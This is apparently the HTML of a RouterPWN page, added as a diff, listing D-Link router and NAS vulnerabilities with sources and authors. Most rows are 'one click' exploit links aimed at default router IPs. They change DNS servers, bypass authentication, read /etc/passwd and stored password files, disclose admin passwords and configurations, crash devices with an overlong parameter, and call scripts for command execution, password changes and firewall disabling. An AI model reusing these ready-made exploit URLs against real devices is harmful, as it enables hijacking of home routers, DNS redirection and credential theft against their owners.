@@ -1,0 +1,1316 @@
+<!DOCTYPE html>
+<html>
+ <head>
+  <title>
+   RouterPWN - D-Link - One click exploits, News, Vulnerabilities, POC, Alerts
+  </title>
+  <link href="/includes/images/favicon.png" rel="apple-touch-icon"/>
+  <link href="/includes/images/favicon.ico" rel="shortcut icon"/>
+  <script src="../includes/jquery-1.11.1.min.js">
+  </script>
+  <script src="../includes/jquery.dataTables.min.js">
+  </script>
+  <link href="../includes/jquery.dataTables.css" rel="stylesheet"/>
+  <link href="../includes/menu.css" rel="stylesheet"/>
+ <script src="../includes/mobile.js"></script>
+<link href='http://fonts.googleapis.com/css?family=PT+Sans' rel='stylesheet' type='text/css'>
+<style>body { font-family: 'PT Sans', sans-serif; font-weight: 400; }</style>
+</head>
+<body>
+  <table align="center" cellspacing="0" style="background-image:url(../includes/images/headerbeta.jpg); background-position:center 0px; background-repeat:no-repeat; " width="925">
+   <tbody>
+    <tr>
+     <td>
+      <center>
+       <img src="../includes/images/logo.gif"/>
+      </center>
+     </td>
+    </tr>
+    <tr>
+     <td>
+      <section class="container">
+       <nav>
+         <ul class="nav" id="menuList">
+         <li>
+          &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+         </li>
+         <li class="active">
+          <a href="/" title="Latest updates by brand">
+           Home
+          </a>
+         </li>
+         <li>
+          <a href="/Generators" title="Online key generators and algorithms">
+           Generators
+          </a>
+         </li>
+         <li>
+          <a href="/Tools" title="Recommended tools for router hacking">
+           Tools
+          </a>
+         </li>
+         <li>
+          <a href="/Contribute" title="Contribute to Routerpwn.com">
+           Contribute
+          </a>
+         </li>
+         <li>
+          <a href="https://twitter.com/routerpwn" title="Follow Routerpwn updates on Twitter">
+           Follow
+          </a>
+         </li>
+         <li>
+          <a href="/Contact" title="Contact us">
+           Contact
+          </a>
+         </li>
+         <li>
+          <a href="/About" title="About Routerpwn.com">
+           About
+          </a>
+         </li>
+         <li>
+          &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+         </li>
+        </ul>
+       </nav>
+      </section>
+     </td>
+    </tr>
+    <tr>
+     <td>
+      <section id="DLink">
+       <h1>
+        D-Link
+       </h1>
+       <table cellspacing="0" class="display" id="tabla" width="100%">
+        <thead>
+         <tr>
+          <th>
+           Date
+          </th>
+          <th>
+           Category
+          </th>
+          <th>
+           Source
+          </th>
+          <th>
+           Title
+          </th>
+          <th>
+           Author
+          </th>
+         </tr>
+        </thead>
+        <tfoot>
+         <tr>
+          <th>
+           Date
+          </th>
+          <th>
+           Category
+          </th>
+          <th>
+           Source
+          </th>
+          <th>
+           Title
+          </th>
+          <th>
+           Author
+          </th>
+         </tr>
+        </tfoot>
+        <tbody>
+		<tr>
+          <td>2016/02/10</td>
+          <td>Metasploit module</td>
+          <td><a href="https://www.exploit-db.com/">Exploit-DB</a></td>
+          <td><a href="https://www.exploit-db.com/exploits/39437/">D-Link DCS-930L Authenticated Remote Command Execution</a></td>
+          <td>Nicholas Starke</td>
+		</tr>
+		<tr>
+          <td>2014/06/21</td>
+          <td>Advisory</td>
+          <td><a href="http://websecurity.com.ua/7179/">websecurity</a></td>
+          <td><a href="http://websecurity.com.ua/7179/">D-Link DAP-1360 CSRF and information disclosure</a></td>
+          <td>MustLive</td>
+		</tr>
+		<tr>
+          <td>2014/06/21</td>
+          <td>Advisory</td>
+          <td><a href="http://websecurity.com.ua/7215/">websecurity</a></td>
+          <td><a href="http://websecurity.com.ua/7215/">D-Link DAP-1360 XSS & CSRF</a></td>
+          <td>MustLive</td>
+		</tr>
+		<tr>
+          <td>2015/06/08</td>
+          <td>One click</td>
+          <td><a href="https://www.exploit-db.com/exploits/37237/">exploit-db</a></td>
+          <td><a href="javascript:setip('/dnscfg.cgi?dnsSecondary='+dns+'&dnsIfcsList=&dnsRefresh=1')" onclick="javascript:dns=prompt('New DNS server:')">D-Link DSL-526B ADSL2+ AU_2.01 - Unauthenticated Remote DNS Change</a></td>
+          <td>Dawid Czagan</td>
+		</tr>
+		<tr>
+          <td>2015/06/08</td>
+          <td>One click</td>
+          <td><a href="https://www.exploit-db.com/exploits/37241/">exploit-db</a></td>
+          <td><a href="javascript:setip('/dnscfg.cgi?dnsSecondary='+dns+'&dnsDynamic=0&dnsRefresh=1')" onclick="javascript:dns=prompt('New DNS server:')">D-Link DSL-526B ADSL2+ AU_2.01 - Unauthenticated Remote DNS Change</a></td>
+          <td>Dawid Czagan</td>
+		</tr>
+		<tr>
+          <td>2015/05/27</td>
+          <td>Advisory</td>
+          <td><a href="http://www.search-lab.hu/media/D-Link_Security_advisory_3_0_public.pdf">search-lab</a></td>
+          <td><a href="http://www.search-lab.hu/media/D-Link_Security_advisory_3_0_public.pdf">Multiple vulnerabilities in D-LINK DNS-320, DNS-320l, DNS-327l, and DNR-326 devices</a></td>
+          <td>Gergely Eberhardt</td>
+		</tr>
+		<tr>
+          <td>2015/06/28</td>
+          <td>Advisory</td>
+          <td><a href="https://tangiblesecurity.com/index.php/2015-06-28-20-46-00/tangible-security-researchers-notified-and-assisted-d-link-with-fixing-critical-device-vulnerabilities">Tangible Security</a></td>
+          <td><a href="https://tangiblesecurity.com/index.php/2015-06-28-20-46-00/tangible-security-researchers-notified-and-assisted-d-link-with-fixing-critical-device-vulnerabilities">DCS-930L DCS-931L DCS-932L DCS-933L DCS-931L - Allows Authenticated User Unrestricted File Upload - CSRF - FW 1.04 and Older</a></td>
+          <td>Allen Harper</td>
+		</tr>
+		<tr>
+          <td>2015/04/10</td>
+          <td>Analysis PoC</td>
+          <td><a href="http://www.devttys0.com/2015/04/hacking-the-d-link-dir-890l/">/dev/ttys0</a></td>
+          <td><a href="http://www.devttys0.com/2015/04/hacking-the-d-link-dir-890l/">DAP-1522 revB, DAP-1650 revB, DIR-890L, DIR-880L, DIR-865L, DIR-860L revA, DIR-860L revB DIR-815 revB, DIR-300 revB, DIR-600 revB, DIR-645, TEW-751DR, TEW-733GR HNAP SOAPAction-Header Command Execution</a></td>
+          <td>Craig Heffner</td>
+		</tr>
+		<tr>
+          <td>2015/05/05</td>
+          <td>Metasploit module</td>
+          <td><a href="http://www.rapid7.com/db/modules/exploit/linux/http/dlink_hnap_header_exec_noauth">Rapid7</a></td>
+          <td><a href="http://www.rapid7.com/db/modules/exploit/linux/http/dlink_hnap_header_exec_noauth">DAP-1522 revB, DAP-1650 revB, DIR-880L, DIR-865L, DIR-860L revA, DIR-860L revB DIR-815 revB, DIR-300 revB, DIR-600 revB, DIR-645, TEW-751DR, TEW-733GR HNAP SOAPAction-Header Command Execution</a></td>
+          <td>Samuel Huntley, Craig Heffner, Michael Messner</td>
+		</tr>
+		<tr>
+          <td>2015/02/26</td>
+          <td>Advisory PoC</td>
+          <td><a href="http://www.kernelpicnic.net">Kernelpicnic</a></td>
+          <td><a href="http://www.kernelpicnic.net/2015/02/26/D-Link-and-TRENDnet-ncc2-service.html">Multiple vulnerabilities in D-Link and TRENDnet 'ncc2' service</a></td>
+          <td>Peter Adkins</td>
+		</tr>
+		<tr>
+          <td>2015/06/11</td>
+          <td>One click</td>
+          <td><a href="http://www.kernelpicnic.net">Kernelpicnic</a></td>
+          <td><a href="javascript:setip('/mplist.txt')">DSP-W110 (Rev A) v1.05b01 Information Disclosure WLAN SSID, MAC, Versions</a></td>
+          <td>Peter Adkins</td>
+		</tr>
+		<tr>
+          <td>2015/06/11</td>
+          <td>Advisory PoC</td>
+          <td><a href="http://www.kernelpicnic.net">Kernelpicnic</a></td>
+          <td><a href="https://github.com/darkarnium/secpub/tree/master/D-Link/DSP-W110">DSP-W110 (Rev A) v1.05b01 Arbitrary command execution / SQL Injection / file upload</a></td>
+          <td>Peter Adkins</td>
+		</tr>
+		<tr>
+          <td>2015/01/30</td>
+          <td>One click</td>
+          <td><a href="http://www.routerpwn.com">Routerpwn</a></td>
+          <td><a href="javascript:setip('/reboot.html')">DSL-2680 Authentication Bypass Reboot</a></td>
+          <td>Dren</td>
+		</tr>
+		<tr>
+          <td>2014/05/20</td>
+          <td>Advisory</td>
+          <td><a href="http://seclists.org/fulldisclosure/2014/May/90">Full Disclosure</a></td>
+          <td><a href="http://seclists.org/fulldisclosure/2014/May/90">2 security bugs in Dlink router DIR-605L</a></td>
+          <td>laalaa</td>
+		</tr>
+		<tr>
+          <td>2013/04/25</td>
+          <td>One click</td>
+          <td><a href="http://www.s3cur1ty.de/m1adv2013-013">s3cur1ty</a></td>
+          <td>
+           <a href="javascript:d635_changepass()">DIR-635 - Change Admin Password</a>
+           <a href="javascript:d635_changepass(ip)" onclick="return ip=prompt('IP:');">[SET IP]</a>
+          </td>
+          <td>m1k3</td>
+		</tr>
+        <tr>
+          <td>
+           2013/07/06
+          </td>
+          <td>
+            Advisory Poc
+          </td>
+        <td>
+           <a href="http://www.s3cur1ty.de/m1adv2013-020">
+            s3cur1ty
+           </a>
+        </td>
+          <td>
+           <a href="http://www.s3cur1ty.de/m1adv2013-020">
+            DIR-300 rev B DIR-600 rev B DIR-645 DIR-845 DIR-865 Command Injection via UPnP</a>
+          </td>
+          <td>
+           m1k3
+          </td>
+         </tr>
+		<tr>
+          <td>
+           2015/02/23
+          </td>
+          <td>
+            Advisory Poc
+          </td>
+        <td>
+           <a href="https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20150519-0_KCodes_NetUSB_Kernel_Stack_Buffer_Overflow_v10.txt">
+            SEC Consult
+           </a>
+        </td>
+          <td>
+           <a href="https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20150519-0_KCodes_NetUSB_Kernel_Stack_Buffer_Overflow_v10.txt">
+            NetUSB DIR-615 C</a>
+          </td>
+          <td>
+           SEC Consult Vulnerability Lab
+          </td>
+         </tr>
+         <tr>
+          <td>
+           2015/05/28
+          </td>
+          <td>
+           Advisory
+          </td>
+          <td>
+           <a href="http://seclists.org/fulldisclosure/2015/May/129">
+Full Disclosure
+           </a>
+          </td>
+          <td>
+           <a href="http://seclists.org/fulldisclosure/2015/May/129">
+            DIR-600 PV6K3A8024009 Universal Plug and Play
+           </a>
+          </td>
+          <td>
+Alvaro Folgado, Jose Rodriguez, Ivan Sanz
+          </td>
+         </tr>
+         <tr>
+          <td>
+           2015/05/28
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://seclists.org/fulldisclosure/2015/May/129">
+Full Disclosure
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.1.1/hidden_info.html">
+            DSL-2750B EU_1.01 Universal Plug and Play
+           </a>
+          </td>
+          <td>
+Alvaro Folgado, Jose Rodriguez, Ivan Sanz
+          </td>
+         </tr>
+         <tr>
+          <td>
+           2015/05/28
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://seclists.org/fulldisclosure/2015/May/129">
+Full Disclosure
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.1.1/hidden_info.html">
+            DSL-2750B EU_1.01 Information Disclosure (Insecure Object References)
+           </a>
+           <a href="javascript:setip('/hidden_info.html');">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+Alvaro Folgado, Jose Rodriguez, Ivan Sanz
+          </td>
+         </tr>
+         <tr>
+          <td>
+           2014/12/08
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="https://www.underground.org.mx/index.php/topic,29919.0.html">
+            Comunidad underground de México
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.0.1/uir//tmp/csman/0">
+            D-Link DIR-514 - Configuration Disclosure
+           </a>
+           <a href="javascript:setip('/uir//tmp/csman/0');">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           flexlm
+          </td>
+         </tr>
+         <tr>
+          <td>
+           2014/12/08
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="https://www.underground.org.mx/index.php/topic,29919.0.html">
+            Comunidad underground de México
+           </a>
+          </td>
+          <td>
+           <a href="javascript:dir514_pathequivalence()">
+            D-Link DIR-514 - Path Equivalence
+           </a>
+           <a href="javascript:dir514_pathequivalence(ip)" onclick="return ip=prompt('IP:');">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           flexlm
+          </td>
+         </tr>
+         <tr>
+          <td>
+           2014/07/31
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://packetstormsecurity.com/files/127686/D-Link-DWR-113-Cross-Site-Request-Forgery.html">
+            Packetstorm
+           </a>
+          </td>
+          <td>
+           <a href="javascript:dwr113_dos();">
+            D-Link DWR-113 - DOS CSRF
+           </a>
+           <a href="javascript:dwr113_dos(ip);" onclick="return ip=prompt('IP:');">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+            Blessen Thomas
+          </td>
+         </tr>
+         <tr>
+          <td>
+           2014/05/22
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://packetstormsecurity.com/files/126779/D-Link-Cross-Site-Scripting-Information-Disclosure.html">
+            Packetstorm
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.0.1/tools_admin.asp/">
+            DGL-5500, DIR-855L, DIR-835 - Admin Password Disclosure
+           </a>
+           <a href="javascript:setip('/tools_admin.asp/');" onclick="return ip=prompt('IP:');">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Kyle Lovett
+          </td>
+         </tr>
+         <tr>
+          <td>
+           2013/04/05
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.s3cur1ty.de/m1adv2013-017">
+            s3cur1ty
+           </a>
+          </td>
+          <td>
+           <a href="javascript:setip('/DevInfo.txt')">
+             DIR-600 DIR-300 revB DIR-815 DIR-645 DIR-412 DIR-456 DIR-110 Information Disclosure
+           </a>
+           <a href="javascript:setip('/version.txt')">
+            [version.txt]
+           </a>
+          </td>
+          <td>
+           m1k3
+          </td>
+         </tr>
+         <tr>
+          <td>
+           2013/04/05
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.s3cur1ty.de/m1adv2013-017">
+            s3cur1ty
+           </a>
+          </td>
+          <td>
+           <a href="javascript:dlink_command()">
+             DIR-600 DIR-300 revB DIR-815 DIR-645 DIR-412 DIR-456 DIR-110 Commmand Injection
+           </a>
+           <a href="javascript:dlink_command(ip)" onclick="return ip=prompt('IP:');">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           m1k3
+          </td>
+         </tr>
+         <tr>
+          <td>
+           2014/04/17
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://packetstormsecurity.com/files/126219/dlinkdap1320-traversalxss.txt">
+            Packetstorm
+           </a>
+          </td>
+          <td>
+           <a href="javascript:dap1320_dirtraversal()">
+            D-Link DAP-1320 Wireless Range Extender - Directory Traversal
+           </a>
+           <a href="javascript:dap1320_dirtraversal(ip)" onclick="return ip=prompt('IP:');">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Kyle Lovett
+          </td>
+         </tr>
+         <tr>
+          <td>
+           2014/01/15
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://1337day.com/exploit/8713">
+            1337day
+           </a>
+          </td>
+          <td>
+           <a href="javascript:dwl2100ap_configdisclosure()">
+            DWL-2100AP - Configuration Disclosure
+           </a>
+           <a href="javascript:dwl2100ap_configdisclosure(ip)" onclick="return ip=prompt('IP:');">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           INTRUDERS TIGER TEAM SECURITY
+          </td>
+         </tr>
+         <tr>
+          <td>
+           2014/15/01
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://1337day.com/exploit/21725">
+            1337day
+           </a>
+          </td>
+          <td>
+           <a href="javascript:dsl2750u_bypassauth()">
+            DSL-2750U - Authentication Bypass
+           </a>
+           <a href="javascript:dsl2750u_bypassauth(ip)" onclick="return ip=prompt('IP:');">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           khaledmohdar
+          </td>
+         </tr>
+         <tr>
+          <td>
+           2013/12/02
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://seclists.org/bugtraq/2013/Dec/11">
+Full Disclosure
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.0.1/model/__show_info.php?REQUIRE_FILE=/var/etc/httpasswd">
+            D-Link DIR-XXX - remote root access exploit
+           </a>
+           <a href="javascript:setip('/model/__show_info.php?REQUIRE_FILE=/var/etc/httpasswd')" onclick="return ip=prompt('IP:');">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           tytusromekiatomek
+          </td>
+         </tr>
+         <tr>
+          <td>
+           2012/05/08
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://1337day.com/exploit/18213">
+            1337day
+           </a>
+          </td>
+          <td>
+           <a href="javascript:document.f2640U.submit()">
+            D-Link DSL-2640U PPoE Data Disclosure (ADSL Router)
+           </a>
+           <a href="javascript:ff2640U();">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           KinG Of PiraTeS
+          </td>
+         </tr>
+         <tr>
+          <td>
+           2013/09/08
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.exploit-db.com/exploits/28239/">
+            Exploit-DB
+           </a>
+          </td>
+          <td>
+           <a href="javascript:dsl2740b_remote()">
+            D-Link DSL-2740B - Enable Remote Management
+           </a>
+           <a href="javascript:dsl2740b_remote(ip)" onclick="return ip=prompt('IP:');">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Ivano Binetti
+          </td>
+         </tr>
+         <tr>
+          <td>
+           2013/09/08
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.exploit-db.com/exploits/28239/">
+            Exploit-DB
+           </a>
+          </td>
+          <td>
+           <a href="javascript:dsl2740b_disablefirewall()">
+            D-Link DSL-2740B - Disable Firewall
+           </a>
+           <a href="javascript:dsl2740b_disablefirewall(ip)" onclick="return ip=prompt('IP:');">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Ivano Binetti
+          </td>
+         </tr>
+         <tr>
+          <td>
+           2013/09/08
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.exploit-db.com/exploits/28239/">
+            Exploit-DB
+           </a>
+          </td>
+          <td>
+           <a href="javascript:dsl2740b_disablemacfilter()">
+            D-Link DSL-2740B - Disable Wireless MAC Filter
+           </a>
+           <a href="javascript:dsl2740b_disablemacfilter(ip)" onclick="return ip=prompt('IP:');">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Ivano Binetti
+          </td>
+         </tr>
+         <tr>
+          <td>
+           2013/07/26
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://securityevaluators.com/content/case-studies/routers/Vulnerability_Catalog.pdf">
+            Securityevaluators
+           </a>
+          </td>
+          <td>
+           <a href="javascript:DIR865L();">
+            DIR 865L PHP file inclusion
+           </a>
+           <a href="javascript:DIR865L(ip);" onclick="return ip=prompt('IP:');">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Jacob Thompson
+          </td>
+         </tr>
+         <tr>
+          <td>
+           2013/05/06
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.s3cur1ty.de/m1adv2013-018">
+            S3cur1ty.de
+           </a>
+          </td>
+          <td>
+           <a href="javascript:dsl320b_configdisclosure()">
+            D-Link DSL-320B - Configuration Disclosure
+           </a>
+           <a href="javascript:dsl320b_configdisclosure(ip)" onclick="return ip=prompt('IP:');">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           m1ke
+          </td>
+         </tr>
+         <tr>
+          <td>
+           2013/04/22
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.s3cur1ty.de/m1adv2013-014">
+            S3cur1ty.de
+           </a>
+          </td>
+          <td>
+           <a href="javascript:dir300615_commandexec()">
+            D-Link DIR-300 - Remote Command Execution
+           </a>
+           <a href="javascript:dir300615_commandexec(ip)" onclick="return ip=prompt('IP:');">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           m1ke
+          </td>
+         </tr>
+         <tr>
+          <td>
+           2013/04/23
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.exploit-db.com/exploits/24975/">
+            Exploit-DB
+           </a>
+          </td>
+          <td>
+           <a href="javascript:d615d3_commandexec()">
+            D-Link DIR-615 D3 - Remote Command Execution
+           </a>
+           <a href="javascript:d615d3_commandexec(ip)" onclick="return ip=prompt('IP:');">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           m-1-k-3
+          </td>
+         </tr>
+         <tr>
+          <td>
+           2013/04/23
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.exploit-db.com/exploits/24975/">
+            Exploit-DB
+           </a>
+          </td>
+          <td>
+           <a href="javascript:d615d3_changepass()">
+            D-Link DIR-615 D3 - Change Admin Password CSRF
+           </a>
+           <a href="javascript:d615d3_changepass(ip)" onclick="return ip=prompt('IP:');">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           m-1-k-3
+          </td>
+         </tr>
+         <tr>
+          <td>
+           2012/02/19
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.exploit-db.com/exploits/18499/">
+            Exploit-DB
+           </a>
+          </td>
+          <td>
+           <a href="javascript:DSL2640B();">
+            DSL-2640B change admin password CSRF
+           </a>
+           <a href="javascript:DSL2640Br();">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Ivano Binetti
+          </td>
+         </tr>
+         <tr>
+          <td>
+           2012/02/08
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.securityfocus.com/bid/50902/info">
+            Securityfocus
+           </a>
+          </td>
+          <td>
+           <a href="javascript:dns320r();">
+            DNS-320 DNS-325 command execution <!-- This is a NAS, not a router, it doesn't have a default IP -->
+           </a>
+          </td>
+          <td>
+           rigan
+          </td>
+         </tr>
+         <tr>
+          <td>
+           2012/02/08
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.securityfocus.com/bid/50902/info">
+            Securityfocus
+           </a>
+          </td>
+          <td>
+           <a href="javascript:setip('/cgi-bin/discovery.cgi');">
+            DNS-320 DNS-325 information disclosure <!-- This is a NAS, not a router, it doesn't have a default IP -->
+           </a>
+          </td>
+          <td>
+           rigan
+          </td>
+         </tr>
+         <tr>
+          <td>
+           2012/02/08
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.securityfocus.com/bid/50902/info">
+            Securityfocus
+           </a>
+          </td>
+          <td>
+           <a href="javascript:setip('/cgi-bin/system_mgr.cgi?cmd=get_firm_v_xml');">
+            DNS-320 DNS-325 information disclosure <!-- This is a NAS, not a router, it doesn't have a default IP -->
+           </a>
+          </td>
+          <td>
+           rigan
+          </td>
+         </tr>
+         <tr>
+          <td>
+           2012/02/10
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://websecurity.com.ua/5567/">
+            Websecurity
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.0.50/index.cgi?res_cmd=20&amp;res_buf=null&amp;res_cmd_type=bl&amp;v2=y&amp;rq=y">
+            DAP-1150 save configuration CSRF
+           </a>
+           <a href="javascript:setip('/index.cgi?res_cmd=20&amp;res_buf=null&amp;res_cmd_type=bl&amp;v2=y&amp;rq=y');">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Eugene Dokukin
+          </td>
+         </tr>
+         <tr>
+          <td>
+           2012/02/10
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://websecurity.com.ua/5567/">
+            Websecurity
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.0.50/index.cgi?res_cmd=6&amp;res_buf=null&amp;res_cmd_type=nbl&amp;v2=y&amp;rq=y">
+            DAP-1150 denial of service
+           </a>
+           <a href="javascript:setip('/index.cgi?res_cmd=6&amp;res_buf=null&amp;res_cmd_type=nbl&amp;v2=y&amp;rq=y');">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Eugene Dokukin
+          </td>
+         </tr>
+         <tr>
+          <td>
+           2011/12/17
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://websecurity.com.ua/5581/">
+            Websecurity
+           </a>
+          </td>
+          <td>
+           <a href="javascript:dsltpass();">
+            DSL-500T reset password CSRF
+           </a>
+           <a href="javascript:dsltpassr();">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Eugene Dokukin
+          </td>
+         </tr>
+         <tr>
+          <td>
+           2011/02/02
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://packetstormsecurity.com/files/98114/D-LINK-DIR-280-Direct-Access-Administrative-Password-Change.html">
+            Packetstorm
+           </a>
+          </td>
+          <td>
+           <a href="javascript:dir280_changepassword()">
+            D-LINK DIR-280 - Change Admin Password
+           </a>
+           <a href="javascript:dir280_changepassword(ip)" onclick="return ip=prompt('IP:');">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Andres Otondo
+          </td>
+         </tr>
+         <tr>
+          <td>
+           2010/12/22
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://seclists.org/fulldisclosure/2010/Dec/569">
+Full Disclosure
+           </a>
+          </td>
+          <td>
+           <a href="javascript:wbrpass();">
+            WBR-1310 Authentication Bypass set new password
+           </a>
+           <a href="javascript:wbrpassr();">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Craig Heffner
+          </td>
+         </tr>
+         <tr>
+          <td>
+           2010/11/09
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.devttys0.com/wp-content/uploads/2010/12/dlink_php_vulnerability.pdf">
+           /dev/ttys0
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.0.1/bsc_lan.php?NO_NEED_AUTH=1&amp;AUTH_GROUP=0">
+            DIR-615, DIR-320, DIR-300 Authentication Bypass
+           </a>
+           <a href="javascript:setip('/bsc_lan.php?NO_NEED_AUTH=1&amp;AUTH_GROUP=0')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Craig Heffner
+          </td>
+         </tr>
+         <tr>
+          <td>
+           2010/08/24
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+<a href="http://securityvulns.com/news/D-Link/DSL-500T/CSRF.html">
+securityvulns
+</a>
+          </td>
+          <td>
+           <a href="http://192.168.1.1/cgi-bin/webcm?getpage=/etc/passwd">
+            DSL-500T Directory Traversal (post auth)
+           </a>
+           <a href="javascript:setip('/cgi-bin/webcm?getpage=/etc/passwd');">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Eugene Dokukin
+          </td>
+         </tr>
+         <tr>
+          <td>
+           2010/08/24
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="#unknown">
+            unknown
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.1.1/cgi-bin/firmwarecfg">
+            DSL-500T old "firmwarecfg" Authentication Bypass
+           </a>
+           <a href="javascript:setip('/cgi-bin/firmwarecfg')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Eugene Dokukin
+          </td>
+         </tr>
+         <tr>
+          <td>
+           2010/06/29
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.icysilence.org/?p=413">
+            Icysilence.org
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.0.50/tools_firmw.htm">
+            DAP-1160 Authentication Bypass
+           </a>
+           <a href="javascript:setip('/tools_firmw.htm')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Cristofaro Mun
+          </td>
+         </tr>
+         <tr>
+          <td>
+           2009/12/15
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.hiredhacker.com/202015/09/12/d-link-dir-615-remote-exploit/">
+           GerryEisenhaur
+           </a>
+          </td>
+          <td>
+           <a href="javascript:dirpass();">
+            DIR-615 change password &amp; enable remote admin
+           </a>
+           <a href="javascript:dirpassr();">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Gerry Eisenhaur
+          </td>
+         </tr>
+         <tr>
+          <td>
+           2008/02/05
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.gnucitizen.org/blog/router-hacking-challenge/">
+            GNUcitizen
+           </a>
+          </td>
+          <td>
+           <a href="javascript:dlidns()">
+            DSL-G604T change DNS servers
+           </a>
+           <a href="javascript:dlidns(ip)" onclick="return ip=prompt('IP:');">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           pdp
+          </td>
+         </tr>
+         <tr>
+          <td>
+           2008/08/25
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.sourcesec.com/Lab/soho_router_report.pdf">
+           Sourcesec <!-- Broken can't locate other source -->
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.0.1/Tools/Admin.shtml">
+            DIR-615 configuration disclosure
+           </a>
+           <a href="javascript:setip('/Tools/Admin.shtml')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           00/00/0?
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://packetstormsecurity.org/0306-exploits/dlinkDoS.txt">
+            Packetstorm
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.0.1/syslog.htm?D=................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................">
+            704P denial of service
+           </a>
+           <a href="javascript:setip('/syslog.htm?D=................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Chris
+          </td>
+         </tr>
+         <tr>
+          <td>
+           2006/10/20
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
